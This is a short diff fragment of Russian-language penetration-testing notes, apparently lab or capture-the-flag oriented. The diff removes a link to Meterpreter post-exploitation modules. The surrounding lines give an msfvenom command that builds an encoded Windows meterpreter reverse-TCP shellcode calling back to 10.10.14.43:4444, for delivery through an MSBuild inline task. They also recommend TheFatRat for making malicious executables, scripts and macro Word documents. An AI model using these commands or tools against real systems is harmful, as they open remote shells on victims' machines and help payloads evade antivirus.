@@ -9,7 +9,6 @@
   
   C помощью этого можно провести meterpreter на машину (https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml)    (msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 21 LHOST=10.10.14.43 LPORT=4444 -f csharp)
   
-  Тут список основных post (https://codeby.net/forum/threads/meterpreter-metasploit-windows-moduli.59219/)
   
   Раздел всяких черных файлов для шелла
                 TheFatRat ( git clone https://github.com/Screetsec/TheFatRat) создаёт всякие черные exe,bat,ps1,Ворды с макросами
